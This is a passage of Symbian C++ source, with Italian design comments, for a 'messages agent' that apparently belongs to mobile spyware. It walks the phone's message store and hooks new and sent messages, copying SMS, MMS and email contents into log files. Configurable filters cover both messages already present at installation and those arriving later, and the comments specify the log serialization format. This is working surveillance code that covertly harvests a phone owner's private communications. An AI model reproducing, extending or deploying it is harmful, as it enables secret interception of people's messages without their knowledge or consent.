			ptrData = (TUint8 *)receiver.Ptr();
			bufTo8->InsertL(bufTo8->Size(),ptrData,receiver.Size());
			if(i < (count-1))
			{
				bufTo->InsertL(bufTo->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
				bufTo8->InsertL(bufTo8->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
			}
		}
		/*
		typeAndLen = EStringTo;
		typeAndLen += bufTo->Size();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), bufTo->Ptr(0), bufTo->Size());
		*/
		// insert To:
		_LIT8(KTo,"\r\nTo: ");
		ptrData = (TUint8 *)KTo().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KTo().Size());
		mailBuffer->InsertL(mailBuffer->Size(), bufTo8->Ptr(0), bufTo8->Size());
		CleanupStack::PopAndDestroy(bufTo8);
		CleanupStack::PopAndDestroy(bufTo);																					
				
		// insert cc
		// TODO: restore when server ready
		/*
		const MDesC16Array &arrayCc = header->CcRecipients();
		count = arrayCc.MdcaCount();
		if(count>0)
		{
		CBufBase* bufCc = CBufFlat::NewL(50);
		CleanupStack::PushL(bufCc);
		for(TInt i = 0; i<count; i++)
		{
			ptrData = (TUint8 *)arrayCc.MdcaPoint(i).Ptr();
			bufCc->InsertL(bufCc->Size(),ptrData,arrayCc.MdcaPoint(i).Size() );
			if(i < (count-1))
				bufCc->InsertL(bufCc->Size(), (TUint8 *)KVirgola().Ptr(), KVirgola().Size());
		}
		typeAndLen = EStringCc;
		typeAndLen += bufCc->Size();
		buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		buffer->InsertL(buffer->Size(), bufCc->Ptr(0), bufCc->Size());
		
		CleanupStack::PopAndDestroy(bufCc);																					
		}
		*/
		
		CleanupStack::PopAndDestroy(header);
		
		// insert body
		// insert MIME header
		// ISO-10646-UCS-2
		_LIT8(KMimeHeader,"\r\nMIME-Version: 1.0\r\nContentType: text/plain; charset=UTF8\r\n\r\n");
		//_LIT8(KMimeHeader,"\r\nMIME-Version: 1.0\r\nContentType: text/plain\r\n\r\n");
		ptrData = (TUint8 *)KMimeHeader().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, KMimeHeader().Size());
		// insert body
		// using CRichText to retrieve body truncates it at 510 bytes... same behaviour as sms truncking at 256 bytes..
		// the following way should be ok
		CBaseMtm* mailMtm = iMtmReg->NewMtmL(aMsvEntryIdx.iMtm);
		CleanupStack::PushL(mailMtm);
		mailMtm->SwitchCurrentEntryL(aMsvId);
		mailMtm->LoadMessageL();
		TInt length = mailMtm->Body().DocumentLength();
		HBufC* bodyBuf = HBufC::NewLC(length*2);
		TPtr ptr(bodyBuf->Des());
		//mailMtm->Body().Extract(ptr,0,length);
		mailMtm->Body().Extract(ptr,0);
		TInt size = ptr.Size();
		CleanupStack::PopAndDestroy(bodyBuf);
		if((aFilter->iMaxMessageSize != 0) && (aFilter->iMaxMessageSize < size)){
		// out of bound
		CleanupStack::PopAndDestroy(mailMtm);
		CleanupStack::PopAndDestroy(entry);
		//CleanupStack::PopAndDestroy(buffer);
		CleanupStack::PopAndDestroy(mailBuffer);
		return HBufC8::New(0);
		}	
		TInt logSize;
		if((aFilter->iMaxMessageBytesToLog!=0) && (aFilter->iMaxMessageBytesToLog < size))
			logSize = aFilter->iMaxMessageBytesToLog;
		else
			logSize = size;
		HBufC* bodyBuf2 = HBufC::NewLC(logSize);
		TPtr ptr2(bodyBuf2->Des());
		mailMtm->Body().Extract(ptr2,0,logSize);
		
		HBufC8* bodyBuf3 = CnvUtfConverter::ConvertFromUnicodeToUtf8L(*bodyBuf2);
		
		//ptrData = (TUint8 *)bodyBuf2->Des().Ptr();
		ptrData = (TUint8 *)bodyBuf3->Des().Ptr();
		mailBuffer->InsertL(mailBuffer->Size(), ptrData, bodyBuf3->Size());
		
		delete bodyBuf3;
		CleanupStack::PopAndDestroy(bodyBuf2);
		CleanupStack::PopAndDestroy(mailMtm);
		//typeAndLen = EObjectMIMEBody;
		//typeAndLen += mailBuffer->Size();
		//buffer->InsertL(buffer->Size(), &typeAndLen, sizeof(typeAndLen));
		//buffer->InsertL(buffer->Size(), mailBuffer->Ptr(0), mailBuffer->Size());
		// TODO: only for test delete when finished
		//WriteMailFile(mailBuffer->Ptr(0));
		
	}
	CleanupStack::PopAndDestroy(entry);
	
	//serializedMsg.iDwSize += buffer->Size();
	
	// insert the log structure 
	//buffer->InsertL(0, &serializedMsg, sizeof(serializedMsg));
	
	//HBufC8* result = buffer->Ptr(0).AllocL();
	HBufC8* result = mailBuffer->Ptr(0).AllocL();
	
	iMailRawAdditionalData.uSize = mailBuffer->Size();
	
	CleanupStack::PopAndDestroy(mailBuffer);
	//CleanupStack::PopAndDestroy(buffer);
	
	// we set here the markup, the buffer is not zero and we know everything
	if(iMarkup.mailMarkup < aMsvEntryIdx.iDate){
		iMarkup.mailMarkup = aMsvEntryIdx.iDate;
	}

	return result;
	}


void CAgentMessages::DoOneRoundL()
	{
	__FLOG(_L("DoOneRoundL"));
	// If the Agent has been stopped, don't proceed on the next round...
	if (iStopLongTask)
		return;

	__FLOG(_L("PopulateArray"));
	// Note: it always exists at least 1 entry in the Array (KMsvRootIndexEntryId)
	// Adds the childs entries to the array so will be processes later.
	PopulateArrayWithChildsTMsvIdEntriesL(iMsvArray[iArrayIndex]);  

	TMsvId msvId = iMsvArray[iArrayIndex];

	TMsvId service;
	TMsvEntry msvEntryIdx;
	TInt res = iMsvSession->GetEntry(msvId, service, msvEntryIdx);
	if ((res == KErrNone) && (msvEntryIdx.iType.iUid == KUidMsvMessageEntryValue)){
		// there's no error and the entry is a message, not KUidMsvServiceEntryValue, KUidMsvFolderEntryValue, KUidMsvAttachmentEntryValue
		if(msvEntryIdx.iMtm == KUidMsgTypeSMS)   //SMS
		{
			if(iSmsCollectFilter->iLog && iSmsCollectFilter->MessageInRange(msvEntryIdx.iDate))
			{
				RBuf8 buf(GetSMSBufferL(msvEntryIdx,msvId));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
					CLogFile* logFile = CLogFile::NewLC(iFs);
					logFile->CreateLogL(LOGTYPE_SMS);
					logFile->AppendLogL(buf);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
				}
				CleanupStack::PopAndDestroy(&buf);
			}
		}
			
		else if (msvEntryIdx.iMtm == KUidMsgTypeMultimedia)   // MMS
		{
			if(iMmsCollectFilter->iLog && iMmsCollectFilter->MessageInRange(msvEntryIdx.iDate))
			{
				RBuf8 buf(GetMMSBufferL(msvEntryIdx,msvId));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
					CLogFile* logFile = CLogFile::NewLC(iFs);
					logFile->CreateLogL(LOGTYPE_MMS);
					logFile->AppendLogL(buf);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
				}
				CleanupStack::PopAndDestroy(&buf);
			}
		}
			
		else if ((msvEntryIdx.iMtm == KUidMsgTypePOP3) || (msvEntryIdx.iMtm == KUidMsgTypeSMTP) || (msvEntryIdx.iMtm == KUidMsgTypeIMAP4))     // Mail
		{
			if(iMailCollectFilter->iLog && iMailCollectFilter->MessageInRange(msvEntryIdx.iDate))
			{
				RBuf8 buf(GetMailBufferL(msvEntryIdx,msvId,iMailCollectFilter));
				buf.CleanupClosePushL();
				if (buf.Length() > 0)
				{
					//__FLOG_HEXDUMP(buf.Ptr(), buf.Length());
					CLogFile* logFile = CLogFile::NewLC(iFs);
					//logFile->CreateLogL(LOGTYPE_MAIL);
					logFile->CreateLogL(LOGTYPE_MAIL_RAW, &iMailRawAdditionalData);
					logFile->AppendLogL(buf);
					logFile->CloseLogL();
					CleanupStack::PopAndDestroy(logFile);
				}
				CleanupStack::PopAndDestroy(&buf);
			}
		}
		
	}
	
	iArrayIndex++;
	if (iArrayIndex >= iMsvArray.Count())	
		{
		// write markup, we have finished the initial dump
		// and we write the date of the most recent changed/added items
		RBuf8 buf(GetMarkupBufferL(iMarkup));
		buf.CleanupClosePushL();
		if (buf.Length() > 0)
		{
			iMarkupFile->WriteMarkupL(Type(),buf);
		}
		CleanupStack::PopAndDestroy(&buf);
				
		__FLOG_1(_L("Processed: %d Entries"), iMsvArray.Count());
		iArrayIndex = 0;
		iMsvArray.Reset();
		iMsvArray.Append(KMsvRootIndexEntryId);  
		return;
		}

	iLongTask->NextRound();
	}

void CAgentMessages::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TAny* aArg2, TAny* aArg3)
	{
	if (!iLogNewMessages)
		return;
	CMsvEntrySelection* entries = STATIC_CAST( CMsvEntrySelection*, aArg1 );
	TMsvId* folderId = STATIC_CAST( TMsvId*, aArg2 );

	__FLOG(_L("HandleSessionEventL"));
	if (entries != NULL)
		{
		__FLOG_1(_L("Entry:%d "), entries->At(0));
		}
	if (folderId != NULL)
		{
		__FLOG_1(_L("Folder:%d "), *folderId);
		}
	switch (aEvent)
		{
		case EMsvServerReady:
			{
			__FLOG(_L("Server Ready"));
			break;
			}
		case EMsvEntriesCreated:
			{
			__FLOG(_L("Created"));
			iNewMessageId = entries->At(0);
			// It is not safe to read the message when it has been created in draft or in inbox... 
			// so we will read it later on Changed Event
			break;
			}
		case EMsvEntriesChanged:
			{
			//aArg1 is a CMsvEntrySelection of the index entries. aArg2 is the TMsvId of the parent entry. 

			__FLOG(_L("Changed"));
			if (iNewMessageId != entries->At(0))
				return;

			// This event will be fired also when the user open a new message for the first time. 
			// (Because the message will change its status and will be marked as read)
			TMsvEntry msvEntry;
			TMsvId service;
			__FLOG(_L("GetEntry"));
			TInt res = iMsvSession->GetEntry(iNewMessageId, service, msvEntry);
			TMsvId msvId = entries->At(0);
			//if (msvEntry.Complete() && msvEntry.New() && (*folderId == KMsvGlobalInBoxIndexEntryId)) // this is original code MB, but on N96 check on New() fails
			if (msvEntry.Complete() /*&& msvEntry.New()*/ && (*folderId == KMsvGlobalInBoxIndexEntryId))
				{
				TBool writeMarkup = EFalse;
				// sms
				if(msvEntry.iMtm == KUidMsgTypeSMS)
				{ 
					if(iSmsRuntimeFilter->iLog && iSmsRuntimeFilter->MessageInRange(msvEntry.iDate))
					{
						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_SMS);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							writeMarkup = ETrue;
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
				// mms
				else if(msvEntry.iMtm == KUidMsgTypeMultimedia)
					{
						if(iMmsRuntimeFilter->iLog && iMmsRuntimeFilter->MessageInRange(msvEntry.iDate))
						{
							RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
							buf.CleanupClosePushL();
							if (buf.Length() > 0)
							{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MMS);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
							}
							CleanupStack::PopAndDestroy(&buf);
						}
					}
				// mail
				else if((msvEntry.iMtm == KUidMsgTypePOP3) || (msvEntry.iMtm == KUidMsgTypeSMTP) || (msvEntry.iMtm == KUidMsgTypeIMAP4))
					{ 
						if(iMailRuntimeFilter->iLog && iMailRuntimeFilter->MessageInRange(msvEntry.iDate))
						{
							RBuf8 buf(GetMailBufferL(msvEntry,msvId,iMailRuntimeFilter));
							buf.CleanupClosePushL();
							if (buf.Length() > 0)
							{
								CLogFile* logFile = CLogFile::NewLC(iFs);
								logFile->CreateLogL(LOGTYPE_MAIL);
								logFile->AppendLogL(buf);
								logFile->CloseLogL();
								CleanupStack::PopAndDestroy(logFile);
								writeMarkup = ETrue;
							}
							CleanupStack::PopAndDestroy(&buf);
						}
					}
				if(writeMarkup)
					{
					if(iMarkupFile->ExistsMarkupL(Type()))
						{
						// if a markup exists, a dump has been performed and this 
						// is the most recent change
						RBuf8 buffer(GetMarkupBufferL(iMarkup));
						buffer.CleanupClosePushL();
						if (buffer.Length() > 0)
							{
							iMarkupFile->WriteMarkupL(Type(),buffer);
							}
						CleanupStack::PopAndDestroy(&buffer);
						}
					}
				iNewMessageId = 0;
				}

			break;
			}
		case EMsvEntriesMoved:
			{
			// aArg1 is a CMsvEntrySelection containing the IDs of the moved entries. aArg2 is the TMsvId of the new parent. aArg3 is the TMsvId of the old parent entry. 

			__FLOG(_L("Moved"));
			TMsvEntry msvEntry;
			TMsvId service;
			TInt res = iMsvSession->GetEntry(entries->At(0), service, msvEntry);
			TMsvId msvId = entries->At(0);

			TBool writeMarkup = EFalse;
			
			if (msvEntry.Complete() && *folderId == KMsvSentEntryId)
			{
				if(msvEntry.iMtm == KUidMsgTypeSMS) 
				{
					if(iSmsRuntimeFilter->iLog && iSmsRuntimeFilter->MessageInRange(msvEntry.iDate))
					{
						RBuf8 buf(GetSMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_SMS);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							writeMarkup = ETrue;
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			}
			else if(msvEntry.iMtm == KUidMsgTypeMultimedia) 
				{
					if(iMmsRuntimeFilter->iLog && iMmsRuntimeFilter->MessageInRange(msvEntry.iDate))
					{
						RBuf8 buf(GetMMSBufferL(msvEntry,msvId));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_MMS);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							writeMarkup = ETrue;
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			// mail
			else if((msvEntry.iMtm == KUidMsgTypePOP3) || (msvEntry.iMtm == KUidMsgTypeSMTP) || (msvEntry.iMtm == KUidMsgTypeIMAP4))
				{ 
					if(iMailRuntimeFilter->iLog && iMailRuntimeFilter->MessageInRange(msvEntry.iDate))
					{
						RBuf8 buf(GetMailBufferL(msvEntry,msvId,iMailRuntimeFilter));
						buf.CleanupClosePushL();
						if (buf.Length() > 0)
						{
							CLogFile* logFile = CLogFile::NewLC(iFs);
							logFile->CreateLogL(LOGTYPE_MAIL);
							logFile->AppendLogL(buf);
							logFile->CloseLogL();
							CleanupStack::PopAndDestroy(logFile);
							writeMarkup = ETrue;
						}
						CleanupStack::PopAndDestroy(&buf);
					}
				}
			if(writeMarkup)
				{
				if(iMarkupFile->ExistsMarkupL(Type()))
					{
					// if a markup exists, a dump has been performed and this 
					// is the most recent change
					RBuf8 buffer(GetMarkupBufferL(iMarkup));
					buffer.CleanupClosePushL();
					if (buffer.Length() > 0)
						{
						iMarkupFile->WriteMarkupL(Type(),buffer);
						}
					CleanupStack::PopAndDestroy(&buffer);
					}
				}
							
			break;
			}
		default:
			break;
		}
	}

/*
TInt64 CAgentMessages::GetFiletime(TTime& aCurrentUtcTime){
	
	_LIT(KInitialTime,"16010000:000000");
	TTime initialTime;
	initialTime.Set(KInitialTime);
		
	TTimeIntervalMicroSeconds interval;
	interval=aCurrentUtcTime.MicroSecondsFrom(initialTime);
		
	return interval.Int64()*10; 
		
}
*/

HBufC8* CAgentMessages::GetMarkupBufferL(const TMarkup aMarkup)
{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	
	TUint32 len = sizeof(len) + sizeof(aMarkup);
	buffer->InsertL(buffer->Size(), &len, sizeof(len));
	buffer->InsertL(buffer->Size(), &aMarkup, sizeof(aMarkup));

	HBufC8* result = buffer->Ptr(0).AllocL();
	CleanupStack::PopAndDestroy(buffer);
	return result;
}


/*
 * A filetime is a 64-bit value that represents the number of 100-nanosecond intervals 
 * that have elapsed since 12:00 A.M. January 1, 1601 Coordinated Universal Time (UTC).
 * Please also note that in defining KInitialTime the month and day values are offset from zero.
 * 
 */
/*
TInt64 CAgentMessages::SetSymbianTime(TUint64 aFiletime){

	_LIT(KFiletimeInitialTime,"16010000:000000");

	TTime initialFiletime;
	initialFiletime.Set(KFiletimeInitialTime);

	TInt64 interval;
	interval = initialFiletime.Int64();

	TInt64 date = aFiletime/10;

	return (interval + date);
}
*/
// TODO: delete this method when finished mail test
/*
void CAgentMessages::WriteMailFile(const TDesC8& aData)
{
	RFile file;
	RFs fs;
		
	TFullName filename(_L("C:\\Data\\mail.txt"));
	
	fs.Connect();
	
	file.Create(fs, filename, EFileWrite | EFileStream | EFileShareAny);
	file.Write(aData);
	file.Flush();
	fs.Close();
}
*/
/*
 Serializzazione dei dati

 Ogni blocco di configurazione e' serializzato anteponendo una DWORD (4 byte), chiamato Prefix, utilizzato per identificare il tipo di dato che segue e la sua lunghezza.

 | TYPE (1 byte) | SIZE (3 bytes) |

 Una serie di oggetti binari serializzati, siano essi stringhe o strutture complesse, risulteranno serializzate come segue:

 | PREFIX | string DATA | PREFIX | struct DATA | PREFIX | ... |

 E' ovviamente possibile serializzare un oggetto a sua volta composto da dati serializzati, come viene fatto per la configurazione dell'agente Messages.
 Configurazione

 La configurazione dell'agente messaggi e' dinamica, e costituita secondo il seguente schema:

 ----------------------
 IDENTIFICATION TAG
 ----------------------
 filtri COLLECT
 ----------------------
 filtri REALTIME
 ----------------------

 LIdentification Tag e' una stringa alfanumerica di 32 byte, generata randomicamente in base al tempo attuale in modo che sia univoca, ed e' utilizzata per verificare in modo semplice se la configurazione e' stata modificata.

 I filtri Collect sono filtri utilizzati per raccogliere messaggi gia' presenti sul telefono all'atto dell'installazione o comunque del primo avvio dell'agente Messages.

 I filtri Realtime sono filtri utilizzati per raccogliere i messaggi in entrata o uscita dal telefono mentre l'agente e' in esecuzione.

 La configurazione e' serializzata col seguente formato:

 | PREFIX | Identification tag | PREFIX | filtro | PREFIX | ... | PREFIX | filtro |

 Ciascun filtro e' applicato ad una sola classe di messaggi (mail, sms o mms), e tutte le keyword ad esso associate vengono applicate su ciascun messaggio di quella classe per verificare se debba essere scartato o accettato.
 Formato dei filtri

 Ciascun filtro e' strutturato come segue:

 -----------
 HEADER
 -----------
 keyword
 -----------
 ...
 -----------
 keyword
 -----------

 Sia il campo header che ciascuna keyword e' serializzata come oggetto singolo. Le keyword sono sempre serializzate come stringhe di WCHAR. Un filtro privo di keyword impone la cattura di tutti i messaggi.

 L'header contiene i seguenti campi:

 #define REALTIME  0
 #define COLLECT   1

 #define AGENTCONF_CLASSNAMELEN  32
 #define FILTER_CLASS_V1_0       0x40000000

 struct AgentClassFilterHeader {
 DWORD Size;                                       // dimensione in byte dell'header e delle keyword
 
 DWORD Version;                                    // al momento, sempre settato a FILTER_CLASS_V1_0
 
 DWORD Type;                                       // REALTIME o COLLECT
 
 TCHAR MessageClass[AGENTCONF_CLASSNAMELEN];       // Classe del messaggio 
 
 BOOL Enabled;                                     // FALSE per le classi disabilitate, altrimenti TRUE
 
 BOOL All;                                         // se TRUE, accetta tutti i messaggi della classe 
 // (ignora keyword)
 
 BOOL DoFilterFromDate;                            // accetta i messaggi a partire da FromDate
 FILETIME FromDate;                  
 
 BOOL DoFilterToDate;                              // accetta i messaggi fino a ToDate
 FILETIME ToDate;                    
 
 LONG MaxMessageSize;                              // filtra in base alla dimensione del messaggio 
 // 0 indica di accettare tutti i messaggi
 
 LONG MaxMessageBytesToLog;                        // di ciascun messaggio, prendi solo MaxMessageBytesToLog  
 // 0 indica di accettare tutto il messaggio
 } header;

 Il parametro MessageClass e' valorizzato con una delle seguenti stringhe, in base al tipo di messaggio a cui il filtro verra' applicato:

 #define CLASS_SMS       TEXT("IPM.SMSText*")
 #define CLASS_MAIL      TEXT("IPM.Note*")
 #define CLASS_MMS       TEXT("IPM.MMS*")

 Perche' la configurazione sia ritenuta valida, e' necessario che siano sempre presenti un filtro realtime e un filtro collect per ciascuna delle classi di messaggio presentate.

 Nel caso in cui siano presenti una o piu' keyword, queste devono essere cercate all'interno di tutti i campi testuali componenti il messaggio (in particolar modo Mittente, Destinatario, Oggetto e corpo del messaggio, qualora presenti). 

 */

/*
 * PER LA CREAZIONE DEL LOG:
 * 
 Per prima cosa c'e' un header che descrive il log:
>
> struct MAPISerializedMessageHeader {
>   DWORD dwSize;             // size of serialized message (this struct
> + class/from/to/subject + message body + attachs)
>   DWORD VersionFlags;       // flags for parsing serialized message
>   LONG Status;              // message status (non considerarlo per
> ora, mettilo a 0)
>   LONG Flags;               // message flags
>   LONG Size;                // message size    (non considerarlo per
> ora, mettilo a 0)
>   FILETIME DeliveryTime;    // delivery time of message (maybe null)
>   DWORD nAttachs;           // number of attachments
> };
>
> VersionFlags per il momento e' definito solo con
> enum VersionFlags {
>   MAPI_V1_0_PROTO          = 0x01000000,  // Protocol Version 1
> };
> L' unico valore per Flags invece e'
> enum MessageFlags {
>     MESSAGE_INCOMING       = 0x00000001,
> };
>
> Questo header e' seguito dai soliti blocchi costituiti dal  
> PREFIX+stringa o PREFIX+DATA
> I tipi di per il PREFIX  che puoi utilizzare sono questi:
>
> enum ObjectTypes {
>   STRING_FOLDER            = 0x01000000,
>   STRING_CLASS             = 0x02000000,
>   STRING_FROM              = 0x03000000,
>   STRING_TO                = 0x04000000,
>   STRING_CC                = 0x05000000,
>   STRING_BCC               = 0x06000000,
>   STRING_SUBJECT           = 0x07000000,
>
>   HEADER_MAPIV1            = 0x20000000,
>
>   OBJECT_MIMEBODY          = 0x80000000,
>   OBJECT_ATTACH            = 0x81000000,
>   OBJECT_DELIVERYTIME      = 0x82000000,
>
>   EXTENDED                 = 0xFF000000,
> };
>
> La FOLDER e' la cartella dove sono posizionati i messaggi, per esempio
> Inviati, In arrivo etc ... se in symbian non esiste una cosa del
> genere definiremo qualcuna.
> La classe del messaggio non e' indispensabile visto che sono gia'
> divisi per logtype, comunque se ti costa poco aggiungila:
> #define CLASS_SMS     TEXT("IPM.SMSText*")
> #define CLASS_MAIL     TEXT("IPM.Note*")
> #define CLASS_MMS     TEXT("IPM.MMS*")
>
> I sucessivi tipi sono esplicativi a parte HEADER_MAPIV1,
> OBJECT_ATTACH, OBJECT_DELIVERYTIME,  EXTENDED che puoi ignorare.
>
> Per quanto riguarda OBJECT_MIMEBODY, devi dirmi se in symbian riesci a
> recuperare il body in formato mime.
 */
 
